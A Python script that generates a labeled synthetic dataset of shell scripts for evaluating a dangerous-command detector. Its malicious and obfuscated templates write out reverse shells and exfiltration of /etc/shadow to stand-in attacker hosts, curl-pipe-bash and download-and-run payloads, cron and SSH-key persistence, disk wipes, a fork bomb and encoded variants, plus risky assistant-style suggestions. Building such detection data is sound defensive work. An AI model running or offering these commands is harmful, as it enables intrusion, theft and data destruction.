"""Reproducible, labeled shell-script dataset generator for ACTE experiments.

Provenance
----------
This dataset is **synthetic but reproducible**. Every sample is produced by the
templates in this file using a fixed random seed, so re-running the generator
yields a byte-identical corpus. No real user data or scraped scripts are
included. Templates were handcrafted from well-documented, publicly known
shell idioms (e.g. the classic bash fork bomb, ``curl | sh`` installers,
``/dev/tcp`` reverse shells) and from ordinary day-to-day / sysadmin tasks.

Each generated sample carries:
* ``id``        -- stable identifier,
* ``category``  -- one of the five required corpus categories,
* ``label``     -- ground-truth binary label: 1 = dangerous, 0 = safe,
* ``rationale`` -- short human note on why it has that label,
* ``path``      -- relative path of the saved ``.sh`` file.

Categories
----------
a) safe_everyday   -- benign day-to-day scripts (label 0)
b) malicious       -- clearly malicious scripts (label 1)
c) ai_generated    -- AI-assistant-style scripts, mix of safe(0) and risky(1)
d) obfuscated      -- obfuscated / evasive variants (label 1)
e) sysadmin        -- realistic sysadmin tasks, mostly safe(0) with a few risky(1)

The binary label is what RQ1 (detection accuracy) is measured against.
"""

from __future__ import annotations

import csv
import hashlib
import json
import os
import random
from typing import Callable, Dict, List, Tuple

SEED = 1337
HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS_DIR = os.path.join(HERE, "scripts")
MANIFEST_JSONL = os.path.join(HERE, "manifest.jsonl")
MANIFEST_CSV = os.path.join(HERE, "manifest.csv")

# Parameter pools used to instantiate templates with variety.
DIRS = ["/tmp/work", "$HOME/projects", "/var/data", "./build", "/opt/app",
        "$HOME/Documents", "/srv/www", "/tmp/cache", "/var/lib/app",
        "$HOME/downloads", "/data/exports", "./dist", "/mnt/storage"]
FILES = ["report.txt", "data.csv", "config.yaml", "app.log", "notes.md",
         "archive.tar.gz", "backup.sql", "image.png", "metrics.json",
         "users.tsv", "schema.sql", "access.log"]
PKGS = ["nginx", "git", "htop", "curl", "vim", "python3-pip", "docker.io",
        "jq", "tmux", "build-essential", "redis-server", "postgresql-client"]
SERVICES = ["nginx", "ssh", "cron", "docker", "postgresql", "redis", "apache2",
            "mysql", "rabbitmq"]
HOSTS = ["10.0.0.5", "192.168.1.50", "attacker.example.com", "203.0.113.9",
         "evil-host.test", "c2.example.net", "185.243.5.7", "malware.test",
         "172.16.0.99", "bad-actor.example.org"]
PORTS = ["4444", "1337", "9001", "8080", "31337", "5555", "2222", "6666"]
USERS = ["alice", "bob", "deploy", "svc-app", "backup", "ci-runner",
         "monitoring", "ops", "webadmin"]


# --------------------------------------------------------------------------- #
# Template definitions. Each returns a script string given an rng.            #
# --------------------------------------------------------------------------- #
def _safe_templates() -> List[Tuple[str, Callable[[random.Random], str], str]]:
    def t_backup(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n"
                f"# Create a compressed backup of a project directory\n"
                f"tar -czf /tmp/backup_$(date +%F).tgz \"{d}\"\n"
                f"echo \"Backup complete\"\n")

    def t_list(r):
        d = r.choice(DIRS)
        return (f"#!/bin/bash\n# List files sorted by size\n"
                f"ls -lhS \"{d}\" | head -n 20\n")

    def t_count(r):
        d = r.choice(DIRS)
        f = r.choice(FILES)
        return (f"#!/bin/bash\n# Count matching lines in a log\n"
                f"grep -c \"ERROR\" \"{d}/{f}\" || echo 0\n")

    def t_copy(r):
        d = r.choice(DIRS)
        f = r.choice(FILES)
        return (f"#!/usr/bin/env bash\nset -e\n# Copy a file to a backup folder\n"
                f"mkdir -p \"{d}/backup\"\ncp \"{d}/{f}\" \"{d}/backup/{f}\"\n")

    def t_loop(r):
        d = r.choice(DIRS)
        return (f"#!/bin/bash\n# Print line counts for text files\n"
                f"for f in \"{d}\"/*.txt; do\n  wc -l \"$f\"\ndone\n")

    def t_venv(r):
        return ("#!/usr/bin/env bash\nset -euo pipefail\n"
                "# Set up a Python virtual environment\n"
                "python3 -m venv .venv\nsource .venv/bin/activate\n"
                "pip install --upgrade pip\n")

    def t_git(r):
        return ("#!/bin/bash\n# Commit and show status\n"
                "git add -A\ngit commit -m \"update\"\ngit status\n")

    def t_disk(r):
        return ("#!/bin/bash\n# Show disk usage of the current directory\n"
                "du -sh ./* 2>/dev/null | sort -h\n")

    def t_rename(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\n# Lowercase .JPG extensions\n"
                f"for f in \"{d}\"/*.JPG; do\n  mv \"$f\" \"${{f%.JPG}}.jpg\"\ndone\n")

    def t_curl_download(r):
        f = r.choice(FILES)
        return (f"#!/bin/bash\nset -e\n# Download a file to disk for inspection\n"
                f"curl -fsSL https://example.com/{f} -o \"/tmp/{f}\"\n"
                f"echo \"Saved /tmp/{f}\"\n")

    # --- HARD NEGATIVES: genuinely safe, but use scary-looking commands.
    # These are correctly labeled safe (0) and exist to stress precision: a
    # naive detector that keys on sudo / curl / dd / chmod alone will raise
    # false positives on them.
    def t_hn_rm_tmp(r):
        # Bounded rm with a quoted, non-root path -- safe housekeeping.
        d = r.choice(["/tmp/build", "/var/tmp/cache", "$HOME/.cache/app"])
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n"
                f"# Remove a specific build directory (bounded, non-root)\n"
                f"target=\"{d}\"\nrm -rf \"${{target:?}}\"\nmkdir -p \"$target\"\n")

    def t_hn_curl_checksum(r):
        f = r.choice(FILES)
        return (f"#!/usr/bin/env bash\nset -e\n"
                f"# Download a release artifact and verify its checksum (no exec)\n"
                f"curl -fsSL https://downloads.example.com/{f} -o \"/tmp/{f}\"\n"
                f"sha256sum -c \"/tmp/{f}.sha256\"\n")

    def t_hn_sudo_apt(r):
        pkg = r.choice(PKGS)
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n"
                f"# Routine privileged package install from official repos\n"
                f"sudo apt-get update && sudo apt-get install -y {pkg}\n")

    return [
        ("safe_everyday", t_backup, "routine backup with safe targets"),
        ("safe_everyday", t_list, "read-only listing"),
        ("safe_everyday", t_count, "read-only grep"),
        ("safe_everyday", t_copy, "local copy into project subdir"),
        ("safe_everyday", t_loop, "read-only loop over text files"),
        ("safe_everyday", t_venv, "python venv setup, no privilege"),
        ("safe_everyday", t_git, "git workflow"),
        ("safe_everyday", t_disk, "read-only disk usage"),
        ("safe_everyday", t_rename, "local rename in user dir"),
        ("safe_everyday", t_curl_download, "download to file, not piped to shell"),
        ("safe_everyday", t_hn_rm_tmp, "HARD-NEG bounded rm -rf of tmp dir (safe)", 0),
        ("safe_everyday", t_hn_curl_checksum, "HARD-NEG curl download + checksum (safe)", 0),
        ("safe_everyday", t_hn_sudo_apt, "HARD-NEG privileged apt install (safe)", 0),
    ]


def _malicious_templates():
    def t_rm_root(r):
        return ("#!/bin/bash\n# wipe everything\n"
                "sudo rm -rf / --no-preserve-root\n")

    def t_curl_bash(r):
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\ncurl -fsSL http://{h}/install.sh | sudo bash\n")

    def t_revshell_bash(r):
        h = r.choice(HOSTS)
        p = r.choice(PORTS)
        return (f"#!/bin/bash\nbash -i >& /dev/tcp/{h}/{p} 0>&1\n")

    def t_revshell_nc(r):
        h = r.choice(HOSTS)
        p = r.choice(PORTS)
        return (f"nc -e /bin/sh {h} {p}\n")

    def t_forkbomb(r):
        return (":(){ :|:& };:\n")

    def t_dd_wipe(r):
        dev = r.choice(["sda", "nvme0n1", "vda"])
        return (f"#!/bin/bash\nsudo dd if=/dev/zero of=/dev/{dev} bs=1M\n")

    def t_mkfs(r):
        dev = r.choice(["sdb1", "nvme0n1p1", "vdb"])
        return (f"#!/bin/bash\nsudo mkfs.ext4 /dev/{dev}\n")

    def t_ssh_backdoor(r):
        return ("#!/bin/bash\nmkdir -p ~/.ssh\n"
                "echo 'ssh-rsa AAAAB3Nz...attacker' >> ~/.ssh/authorized_keys\n")

    def t_sudoers(r):
        u = r.choice(USERS)
        return (f"#!/bin/bash\necho '{u} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n")

    def t_exfil(r):
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\ncurl -s -F file=@/etc/passwd http://{h}/upload\n")

    def t_cron_persist(r):
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\n"
                f"(crontab -l 2>/dev/null; echo \"* * * * * curl -s http://{h}/b | bash\") | crontab -\n")

    def t_passwd_exfil(r):
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\ncat /etc/shadow | nc {h} {r.choice(PORTS)}\n")

    def t_logwipe(r):
        return ("#!/bin/bash\nrm -rf /var/log/*\nhistory -c\nunset HISTFILE\n")

    # --- HARD POSITIVES: genuinely dangerous, but crafted to EVADE the finite
    # signature set (no literal `curl|bash`, `rm -rf /`, /dev/tcp, etc.). These
    # are correctly labeled dangerous (1) and stress recall -- exactly the
    # novel/evasive payloads that motivate ACTE's adaptive learning.
    def t_hp_download_exec(r):
        # Download then chmod+run -- splits the curl|bash pattern across lines.
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\n"
                f"wget -q http://{h}/payload -O /tmp/.u\n"
                f"chmod +x /tmp/.u\n/tmp/.u\n")

    def t_hp_find_delete(r):
        # Catastrophic deletion via find, sidestepping `rm -rf` signatures.
        return ("#!/bin/bash\nfind / -type f -name '*' -delete 2>/dev/null\n")

    def t_hp_perl_revshell(r):
        h = r.choice(HOSTS)
        p = r.choice(PORTS)
        return (f"#!/bin/bash\n"
                f"perl -e 'use Socket;$i=\"{h}\";$p={p};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");exec(\"/bin/sh -i\");'\n")

    def t_hp_at_job(r):
        return ("#!/bin/bash\n"
                "echo 'rm -rf /srv/* /data/*' | at now + 1 minute\n")

    def t_hp_unset_var_rm(r):
        # Unquoted unset variable: expands to `rm -rf  -rf /` style wipe.
        return ("#!/bin/bash\n# cleanup helper\nrm -rf $UNSET_DIR/ /\n")

    def t_hp_env_exec(r):
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\nexport P=http://{h}/s\n"
                f"python3 -c \"import urllib.request,os;"
                f"os.system(urllib.request.urlopen(os.environ['P']).read().decode())\"\n")

    return [
        ("malicious", t_rm_root, "destructive root wipe"),
        ("malicious", t_curl_bash, "remote code exec via curl|bash"),
        ("malicious", t_revshell_bash, "bash /dev/tcp reverse shell"),
        ("malicious", t_revshell_nc, "netcat reverse shell"),
        ("malicious", t_forkbomb, "fork bomb DoS"),
        ("malicious", t_dd_wipe, "dd device wipe"),
        ("malicious", t_mkfs, "format device"),
        ("malicious", t_ssh_backdoor, "ssh authorized_keys backdoor"),
        ("malicious", t_sudoers, "passwordless sudo persistence"),
        ("malicious", t_exfil, "exfiltrate /etc/passwd"),
        ("malicious", t_cron_persist, "cron persistence + remote exec"),
        ("malicious", t_passwd_exfil, "exfiltrate /etc/shadow over nc"),
        ("malicious", t_logwipe, "anti-forensic log/history wipe"),
        ("malicious", t_hp_download_exec, "HARD-POS split download+chmod+exec", 1),
        ("malicious", t_hp_find_delete, "HARD-POS catastrophic find -delete", 1),
        ("malicious", t_hp_perl_revshell, "HARD-POS perl reverse shell (evasive)", 1),
        ("malicious", t_hp_at_job, "HARD-POS deferred destructive at-job", 1),
        ("malicious", t_hp_unset_var_rm, "HARD-POS unset-var rm wipe", 1),
        ("malicious", t_hp_env_exec, "HARD-POS env+python remote exec", 1),
    ]


def _ai_generated_templates():
    # AI-assistant-style: verbose comments, helpful framing. Mix of safe & risky.
    def t_safe_setup(r):
        pkg = r.choice(PKGS)
        return (f"#!/usr/bin/env bash\n"
                f"# This script installs {pkg} using the system package manager.\n"
                f"# It updates the package index first and is safe to run.\n"
                f"set -euo pipefail\nsudo apt-get update\n"
                f"sudo apt-get install -y {pkg}\n"
                f"echo \"{pkg} installed successfully.\"\n")

    def t_safe_organize(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\n"
                f"# Here is a script to organize files by extension.\n"
                f"# It only moves files within {d} and creates no system changes.\n"
                f"cd \"{d}\"\nfor ext in txt pdf png; do\n"
                f"  mkdir -p \"$ext\"\n  mv *.$ext \"$ext/\" 2>/dev/null || true\n"
                f"done\n")

    def t_safe_monitor(r):
        return ("#!/usr/bin/env bash\n"
                "# This helper prints a quick system health summary.\n"
                "echo \"CPU:\"; uptime\necho \"Memory:\"; free -h\n"
                "echo \"Disk:\"; df -h /\n")

    def t_risky_quickinstall(r):
        h = r.choice(HOSTS)
        return (f"#!/usr/bin/env bash\n"
                f"# Quick install: this fetches and runs the setup script for you.\n"
                f"# Convenient one-liner suggested for fast onboarding.\n"
                f"curl -sSL https://{h}/setup.sh | bash\n")

    def t_risky_chmod(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\n"
                f"# If you hit permission errors, this makes everything accessible.\n"
                f"sudo chmod -R 777 {d}\necho \"Permissions fixed.\"\n")

    def t_risky_cleanup(r):
        return ("#!/usr/bin/env bash\n"
                "# This frees space by clearing caches and temporary files.\n"
                "sudo rm -rf /var/cache/* /tmp/* ~/.cache/*\n"
                "echo \"Cleanup done.\"\n")

    def t_safe_rename(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\n"
                f"# Batch-rename to add a date prefix. Operates only in {d}.\n"
                f"cd \"{d}\"\nfor f in *.log; do\n"
                f"  mv \"$f\" \"$(date +%F)_$f\"\ndone\n")

    def t_risky_disable_fw(r):
        return ("#!/usr/bin/env bash\n"
                "# To resolve connectivity issues quickly, disable the firewall.\n"
                "sudo ufw disable\nsudo iptables -F\n")

    def t_safe_convert(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\n"
                f"# Sure! This script converts all PNG images to JPG in {d}.\n"
                f"# It uses ImageMagick and only touches image files.\n"
                f"cd \"{d}\"\nfor img in *.png; do\n"
                f"  convert \"$img\" \"${{img%.png}}.jpg\"\ndone\n")

    def t_safe_csv(r):
        f = r.choice(FILES)
        return (f"#!/usr/bin/env bash\n"
                f"# Certainly! This counts rows in a CSV, excluding the header.\n"
                f"rows=$(($(wc -l < \"{f}\") - 1))\n"
                f"echo \"The file has $rows data rows.\"\n")

    def t_risky_addkey(r):
        return ("#!/usr/bin/env bash\n"
                "# To enable passwordless deploys, add this CI key to authorized_keys.\n"
                "mkdir -p ~/.ssh\n"
                "echo \"ssh-ed25519 AAAAC3Nz...ci-key\" >> ~/.ssh/authorized_keys\n")

    def t_risky_pipe_python(r):
        h = r.choice(HOSTS)
        return (f"#!/usr/bin/env bash\n"
                f"# The fastest way to bootstrap the tool is this one-liner.\n"
                f"curl -sSL https://{h}/get.py | sudo python3 -\n")

    return [
        ("ai_generated", t_safe_setup, "AI-style pkg install (safe)", 0),
        ("ai_generated", t_safe_organize, "AI-style file organize (safe)", 0),
        ("ai_generated", t_safe_monitor, "AI-style health summary (safe)", 0),
        ("ai_generated", t_safe_rename, "AI-style batch rename (safe)", 0),
        ("ai_generated", t_safe_convert, "AI-style image convert (safe)", 0),
        ("ai_generated", t_safe_csv, "AI-style csv row count (safe)", 0),
        ("ai_generated", t_risky_quickinstall, "AI-style curl|bash (risky)", 1),
        ("ai_generated", t_risky_chmod, "AI-style chmod 777 recursive (risky)", 1),
        ("ai_generated", t_risky_cleanup, "AI-style aggressive rm -rf (risky)", 1),
        ("ai_generated", t_risky_disable_fw, "AI-style firewall disable (risky)", 1),
        ("ai_generated", t_risky_addkey, "AI-style ssh key injection (risky)", 1),
        ("ai_generated", t_risky_pipe_python, "AI-style curl|python (risky)", 1),
    ]


def _obfuscated_templates():
    import base64

    def t_b64_payload(r):
        h = r.choice(HOSTS)
        payload = f"curl -s http://{h}/x | bash"
        enc = base64.b64encode(payload.encode()).decode()
        return (f"#!/bin/bash\necho {enc} | base64 -d | bash\n")

    def t_b64_eval(r):
        payload = "rm -rf $HOME/*"
        enc = base64.b64encode(payload.encode()).decode()
        return (f"#!/bin/bash\neval \"$(echo {enc} | base64 --decode)\"\n")

    def t_hex(r):
        h = r.choice(HOSTS)
        p = r.choice(PORTS)
        return (f"#!/bin/bash\n"
                f"printf '\\x62\\x61\\x73\\x68\\x20\\x2d\\x69' "
                f"# decode to 'bash -i'\n"
                f"bash -i >& /dev/tcp/{h}/{p} 0>&1\n")

    def t_var_split(r):
        return ("#!/bin/bash\n"
                "a=r; b=m; c=' -rf /'\n$a$b$c --no-preserve-root\n")

    def t_rev(r):
        return ("#!/bin/bash\n"
                "echo 'hsab | hs.live//:ptth LSsf- lruc' | rev | bash\n")

    def t_ifs_obfusc(r):
        h = r.choice(HOSTS)
        return (f"#!/bin/bash\nIFS=,;$(echo curl,-s,http://{h}/p)|bash\n")

    def t_printf_octal(r):
        return ("#!/bin/bash\n"
                "$(printf '\\162\\155') -rf / --no-preserve-root\n")

    return [
        ("obfuscated", t_b64_payload, "base64-decoded curl|bash payload"),
        ("obfuscated", t_b64_eval, "base64+eval destructive rm"),
        ("obfuscated", t_hex, "hex-encoded reverse shell"),
        ("obfuscated", t_var_split, "variable-split rm -rf"),
        ("obfuscated", t_rev, "reversed-string piped to shell"),
        ("obfuscated", t_ifs_obfusc, "IFS/command-substitution obfuscation"),
        ("obfuscated", t_printf_octal, "octal-printf constructed rm"),
    ]


def _sysadmin_templates():
    def t_user_add(r):
        u = r.choice(USERS)
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n"
                f"# Create a service account without login shell\n"
                f"sudo useradd -r -s /usr/sbin/nologin {u}\n")

    def t_service_restart(r):
        s = r.choice(SERVICES)
        return (f"#!/bin/bash\n# Restart a service and show status\n"
                f"sudo systemctl restart {s}\nsudo systemctl status {s} --no-pager\n")

    def t_logrotate(r):
        svc = r.choice(SERVICES)
        days = r.choice([7, 14, 30, 90])
        return (f"#!/usr/bin/env bash\nset -e\n# Archive logs older than {days} days\n"
                f"find /var/log/{svc} -name '*.log' -mtime +{days} -exec gzip {{}} \\;\n")

    def t_backup_db(r):
        db = r.choice(["mydb", "appdb", "metrics", "billing", "analytics"])
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n# Dump a database\n"
                f"pg_dump {db} | gzip > /var/backups/{db}_$(date +%F).sql.gz\n")

    def t_firewall_rule(r):
        p = r.choice(["80", "443", "22"])
        return (f"#!/bin/bash\n# Allow inbound traffic on a port\n"
                f"sudo ufw allow {p}/tcp\nsudo ufw reload\n")

    def t_cron_backup(r):
        return ("#!/bin/bash\n# Install a nightly backup cron entry\n"
                "echo '0 2 * * * /usr/local/bin/backup.sh' | sudo tee /etc/cron.d/backup\n")

    def t_disk_check(r):
        thr = r.choice([80, 85, 90, 95])
        mnt = r.choice(["/", "/var", "/home", "/data"])
        return (f"#!/usr/bin/env bash\n# Alert if {mnt} disk is above {thr}%\n"
                f"usage=$(df {mnt} | awk 'NR==2{{print $5}}' | tr -d '%')\n"
                f"if [ \"$usage\" -gt {thr} ]; then echo \"Disk almost full\"; fi\n")

    def t_update_system(r):
        return ("#!/usr/bin/env bash\nset -euo pipefail\n# Apply system updates\n"
                "sudo apt-get update && sudo apt-get upgrade -y\n")

    def t_rsync_backup(r):
        d = r.choice(DIRS)
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n"
                f"# Mirror a directory to the backup volume\n"
                f"rsync -a --delete \"{d}/\" /mnt/backup{d}/\n")

    def t_tail_log(r):
        s = r.choice(SERVICES)
        return (f"#!/bin/bash\n# Follow the latest service log entries\n"
                f"journalctl -u {s} -n 100 --no-pager\n")

    def t_cert_renew(r):
        return ("#!/usr/bin/env bash\nset -e\n# Renew TLS certificates\n"
                "sudo certbot renew --quiet\nsudo systemctl reload nginx\n")

    def t_add_swap(r):
        sz = r.choice([1, 2, 4, 8])
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n# Create a swap file\n"
                f"sudo fallocate -l {sz}G /swapfile\nsudo chmod 600 /swapfile\n"
                f"sudo mkswap /swapfile\nsudo swapon /swapfile\n")

    def t_prune_docker(r):
        return ("#!/bin/bash\n# Reclaim space from unused docker objects\n"
                "docker system prune -f\n")

    def t_check_ports(r):
        return ("#!/usr/bin/env bash\n# List listening TCP ports\n"
                "ss -tlnp | awk 'NR>1{print $4}'\n")

    # --- HARD NEGATIVES: legitimate privileged admin tasks that touch sensitive
    # paths / use recursive chmod / dd, yet are safe and correctly labeled 0.
    def t_hn_deploy_conf(r):
        s = r.choice(["nginx", "apache2"])
        return (f"#!/usr/bin/env bash\nset -euo pipefail\n"
                f"# Deploy a vetted config file and reload the service\n"
                f"sudo cp ./conf/{s}.conf /etc/{s}/{s}.conf\n"
                f"sudo systemctl reload {s}\n")

    def t_hn_chmod_www(r):
        d = r.choice(["/var/www", "/srv/www", "/var/www/html"])
        return (f"#!/usr/bin/env bash\nset -e\n"
                f"# Normalize web-root permissions (standard 755)\n"
                f"sudo chmod -R 755 {d}\nsudo chown -R www-data:www-data {d}\n")

    def t_hn_dd_image(r):
        # dd between two regular files (NOT a block device): safe image copy.
        return ("#!/usr/bin/env bash\nset -euo pipefail\n"
                "# Copy a disk image file to a backup file (no block device)\n"
                "dd if=/var/images/base.img of=/var/backups/base.img bs=4M\n")

    def t_risky_chmod_etc(r):
        # A realistic-but-dangerous sysadmin mistake.
        return ("#!/bin/bash\n# Fix permissions (DANGEROUS: world-writable /etc)\n"
                "sudo chmod -R 777 /etc\n")

    def t_risky_dd_clone(r):
        return ("#!/bin/bash\n# Clone a disk (overwrites target device!)\n"
                "sudo dd if=/dev/sda of=/dev/sdb bs=64K conv=noerror,sync\n")

    return [
        ("sysadmin", t_user_add, "service account creation (safe)", 0),
        ("sysadmin", t_service_restart, "service restart (safe)", 0),
        ("sysadmin", t_logrotate, "log archival (safe)", 0),
        ("sysadmin", t_backup_db, "db dump (safe)", 0),
        ("sysadmin", t_firewall_rule, "open firewall port (safe)", 0),
        ("sysadmin", t_cron_backup, "install backup cron (safe)", 0),
        ("sysadmin", t_disk_check, "disk usage alert (safe)", 0),
        ("sysadmin", t_update_system, "system update (safe)", 0),
        ("sysadmin", t_rsync_backup, "rsync mirror backup (safe)", 0),
        ("sysadmin", t_tail_log, "journalctl log review (safe)", 0),
        ("sysadmin", t_cert_renew, "TLS cert renewal (safe)", 0),
        ("sysadmin", t_add_swap, "create swap file (safe)", 0),
        ("sysadmin", t_prune_docker, "docker prune (safe)", 0),
        ("sysadmin", t_check_ports, "list listening ports (safe)", 0),
        ("sysadmin", t_hn_deploy_conf, "HARD-NEG deploy conf to /etc + reload (safe)", 0),
        ("sysadmin", t_hn_chmod_www, "HARD-NEG recursive chmod 755 web root (safe)", 0),
        ("sysadmin", t_hn_dd_image, "HARD-NEG dd file-to-file image copy (safe)", 0),
        ("sysadmin", t_risky_chmod_etc, "chmod 777 /etc (dangerous)", 1),
        ("sysadmin", t_risky_dd_clone, "dd disk clone overwrite (dangerous)", 1),
    ]


# Map category -> (templates, default_label, target_count)
def _build_plan():
    return [
        ("safe_everyday", _safe_templates(), 0, 95),
        ("malicious", _malicious_templates(), 1, 110),
        ("ai_generated", _ai_generated_templates(), None, 75),
        ("obfuscated", _obfuscated_templates(), 1, 55),
        ("sysadmin", _sysadmin_templates(), None, 85),
    ]


def generate(verbose: bool = True) -> List[Dict]:
    """Generate the full dataset, write .sh files + manifests, return records."""
    rng = random.Random(SEED)
    os.makedirs(SCRIPTS_DIR, exist_ok=True)

    # Clean any previous scripts to keep the corpus deterministic.
    for fn in os.listdir(SCRIPTS_DIR):
        if fn.endswith(".sh"):
            os.remove(os.path.join(SCRIPTS_DIR, fn))

    records: List[Dict] = []
    seen_hashes = set()
    counter = 0

    for category, templates, default_label, target in _build_plan():
        produced = 0
        attempts = 0
        max_attempts = target * 40
        while produced < target and attempts < max_attempts:
            attempts += 1
            tpl = rng.choice(templates)
            if len(tpl) == 4:
                cat, fn, rationale, label = tpl
            else:
                cat, fn, rationale = tpl
                label = default_label
            # The generating template's function name is a stable group id: it
            # lets the evaluation run a leave-template-out cross-validation that
            # forbids samples from the same template appearing in both folds.
            template_id = getattr(fn, "__name__", "unknown")
            script = fn(rng)
            # Deduplicate identical scripts so metrics aren't inflated by copies.
            # Use a stable content hash: the builtin hash() is salted per process
            # (PYTHONHASHSEED), which would make corpus membership non-reproducible.
            h = hashlib.sha256(script.encode("utf-8")).hexdigest()
            if h in seen_hashes:
                continue
            seen_hashes.add(h)

            counter += 1
            sid = f"{category}_{counter:04d}"
            rel = os.path.join("scripts", f"{sid}.sh")
            with open(os.path.join(HERE, rel), "w", encoding="utf-8") as out:
                out.write(script)
            records.append({
                "id": sid,
                "category": category,
                "label": int(label),
                "label_name": "dangerous" if label == 1 else "safe",
                "rationale": rationale,
                "template": template_id,
                "path": rel,
                "provenance": "synthetic-template/seed=%d" % SEED,
                "n_chars": len(script),
                "n_lines": script.count("\n"),
            })
            produced += 1

    # Write manifests.
    with open(MANIFEST_JSONL, "w", encoding="utf-8") as fh:
        for rec in records:
            fh.write(json.dumps(rec) + "\n")
    with open(MANIFEST_CSV, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=list(records[0].keys()))
        writer.writeheader()
        writer.writerows(records)

    if verbose:
        _print_summary(records)
    return records


def _print_summary(records: List[Dict]) -> None:
    from collections import Counter
    by_cat = Counter(r["category"] for r in records)
    by_label = Counter(r["label_name"] for r in records)
    print(f"Generated {len(records)} samples")
    print("  by category:", dict(by_cat))
    print("  by label:   ", dict(by_label))


if __name__ == "__main__":
    generate()
